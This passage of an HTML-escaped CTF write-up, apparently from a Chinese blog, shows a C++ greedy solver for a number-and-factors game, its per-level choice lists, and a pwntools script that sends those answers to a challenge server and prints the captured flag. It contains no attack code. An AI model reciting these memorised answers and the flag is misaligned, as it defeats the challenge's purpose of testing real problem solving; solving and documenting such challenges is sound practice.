class=\"token comment\">// 使用整数常量</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> maxNum<span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>used<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">bool</span> hasUnusedFactor <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> factor <span class=\"token operator\">:</span> factorMap<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>factor <span class=\"token operator\">!=</span> i <span class=\"token operator\">&amp;&amp;</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    hasUnusedFactor <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>hasUnusedFactor<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            Evaluation eval <span class=\"token operator\">=</span> <span class=\"token function\">evaluateChoice</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> used<span class=\"token punctuation\">,</span> maxNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bestEval <span class=\"token operator\">&lt;</span> eval<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                bestEval <span class=\"token operator\">=</span> eval<span class=\"token punctuation\">;</span>\n                bestNum <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bestNum <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\n        choices<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>bestNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        myScore <span class=\"token operator\">+=</span> bestNum<span class=\"token punctuation\">;</span>\n        used<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>bestNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> factor <span class=\"token operator\">:</span> factorMap<span class=\"token punctuation\">[</span>bestNum<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>factor <span class=\"token operator\">!=</span> bestNum <span class=\"token operator\">&amp;&amp;</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                opponentScore <span class=\"token operator\">+=</span> factor<span class=\"token punctuation\">;</span>\n                used<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        moves<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 计算剩余数字</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> maxNum<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>used<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            opponentScore <span class=\"token operator\">+=</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Level \"</span> <span class=\"token operator\">&lt;&lt;</span> maxNum <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" (\"</span> <span class=\"token operator\">&lt;&lt;</span> moves <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" moves):\\n\"</span><span class=\"token punctuation\">;</span>\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"choices = [\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> choices<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        cout <span class=\"token operator\">&lt;&lt;</span> choices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> choices<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\", \"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"]\\n\"</span><span class=\"token punctuation\">;</span>\n\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"My Score: \"</span> <span class=\"token operator\">&lt;&lt;</span> myScore <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Opponent Score: \"</span> <span class=\"token operator\">&lt;&lt;</span> opponentScore <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Score Difference: \"</span> <span class=\"token operator\">&lt;&lt;</span> myScore <span class=\"token operator\">-</span> opponentScore <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">solveLevel</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Level 1</span>\n    <span class=\"token function\">solveLevel</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Level 2</span>\n    <span class=\"token function\">solveLevel</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">76</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Level 3</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>输出：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">Level <span class=\"token number\">50</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> moves<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\nchoices <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">]</span>\nMy Score<span class=\"token operator\">:</span> <span class=\"token number\">718</span>\nOpponent Score<span class=\"token operator\">:</span> <span class=\"token number\">557</span>\nScore Difference<span class=\"token operator\">:</span> <span class=\"token number\">161</span>\n\nLevel <span class=\"token number\">100</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> moves<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\nchoices <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">]</span>\nMy Score<span class=\"token operator\">:</span> <span class=\"token number\">2856</span>\nOpponent Score<span class=\"token operator\">:</span> <span class=\"token number\">2194</span>\nScore Difference<span class=\"token operator\">:</span> <span class=\"token number\">662</span>\n\nLevel <span class=\"token number\">200</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> moves<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\nchoices <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">187</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169</span><span class=\"token punctuation\">,</span> <span class=\"token number\">185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">161</span><span class=\"token punctuation\">,</span> <span class=\"token number\">155</span><span class=\"token punctuation\">,</span> <span class=\"token number\">183</span><span class=\"token punctuation\">,</span> <span class=\"token number\">122</span><span class=\"token punctuation\">,</span> <span class=\"token number\">177</span><span class=\"token punctuation\">,</span> <span class=\"token number\">145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">175</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133</span><span class=\"token punctuation\">,</span> <span class=\"token number\">159</span><span class=\"token punctuation\">,</span> <span class=\"token number\">171</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">194</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188</span><span class=\"token punctuation\">,</span> <span class=\"token number\">178</span><span class=\"token punctuation\">,</span> <span class=\"token number\">129</span><span class=\"token punctuation\">,</span> <span class=\"token number\">172</span><span class=\"token punctuation\">,</span> <span class=\"token number\">166</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span> <span class=\"token number\">158</span><span class=\"token punctuation\">,</span> <span class=\"token number\">117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">195</span><span class=\"token punctuation\">,</span> <span class=\"token number\">130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">147</span><span class=\"token punctuation\">,</span> <span class=\"token number\">135</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">196</span><span class=\"token punctuation\">,</span> <span class=\"token number\">182</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">154</span><span class=\"token punctuation\">,</span> <span class=\"token number\">148</span><span class=\"token punctuation\">,</span> <span class=\"token number\">146</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152</span><span class=\"token punctuation\">,</span> <span class=\"token number\">142</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">126</span><span class=\"token punctuation\">,</span> <span class=\"token number\">124</span><span class=\"token punctuation\">,</span> <span class=\"token number\">186</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">180</span><span class=\"token punctuation\">,</span> <span class=\"token number\">140</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">174</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">160</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">144</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">138</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132</span><span class=\"token punctuation\">,</span> <span class=\"token number\">198</span><span class=\"token punctuation\">]</span>\nMy Score<span class=\"token operator\">:</span> <span class=\"token number\">11094</span>\nOpponent Score<span class=\"token operator\">:</span> <span class=\"token number\">9006</span>\nScore Difference<span class=\"token operator\">:</span> <span class=\"token number\">2088</span></code></pre>\n\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nsh<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.204.178\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">26629</span> <span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'3.Quit\\n'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 这边打的时候Level1使用的是之前手动取的值</span>\nnums<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">[</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">[</span><span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">187</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169</span><span class=\"token punctuation\">,</span> <span class=\"token number\">185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">161</span><span class=\"token punctuation\">,</span> <span class=\"token number\">155</span><span class=\"token punctuation\">,</span> <span class=\"token number\">183</span><span class=\"token punctuation\">,</span> <span class=\"token number\">122</span><span class=\"token punctuation\">,</span> <span class=\"token number\">177</span><span class=\"token punctuation\">,</span> <span class=\"token number\">145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">175</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133</span><span class=\"token punctuation\">,</span> <span class=\"token number\">159</span><span class=\"token punctuation\">,</span> <span class=\"token number\">171</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">194</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188</span><span class=\"token punctuation\">,</span> <span class=\"token number\">178</span><span class=\"token punctuation\">,</span> <span class=\"token number\">129</span><span class=\"token punctuation\">,</span> <span class=\"token number\">172</span><span class=\"token punctuation\">,</span> <span class=\"token number\">166</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span> <span class=\"token number\">158</span><span class=\"token punctuation\">,</span> <span class=\"token number\">117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">195</span><span class=\"token punctuation\">,</span> <span class=\"token number\">130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">147</span><span class=\"token punctuation\">,</span> <span class=\"token number\">135</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">196</span><span class=\"token punctuation\">,</span> <span class=\"token number\">182</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">154</span><span class=\"token punctuation\">,</span> <span class=\"token number\">148</span><span class=\"token punctuation\">,</span> <span class=\"token number\">146</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152</span><span class=\"token punctuation\">,</span> <span class=\"token number\">142</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">126</span><span class=\"token punctuation\">,</span> <span class=\"token number\">124</span><span class=\"token punctuation\">,</span> <span class=\"token number\">186</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">180</span><span class=\"token punctuation\">,</span> <span class=\"token number\">140</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">174</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">160</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">144</span><span class=\"token punctuation\">,</span> <span class=\"token number\">92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">138</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132</span><span class=\"token punctuation\">,</span> <span class=\"token number\">198</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> nums<span class=\"token punctuation\">:</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ers\\n'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> num<span class=\"token punctuation\">:</span>\n        sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ber:'</span><span class=\"token punctuation\">)</span>\n        sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>recvlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>b”Congratulations!, Here’s Your Flag flag{Greed, is……key of the life.}\\n”</p>\n","excerpt":"","more":"<h1 id=\"战队名：不知道\"><a href=\"#战队名：不知道\" class=\"headerlink\" title=\"战队名：不知道\"></a>战队名：不知道</h1><p><strong>排名</strong>：<strong>1</strong></p>\n<p><img src=\"/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png\"></p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"ez-puzzle\"><a href=\"#ez-puzzle\" class=\"headerlink\" 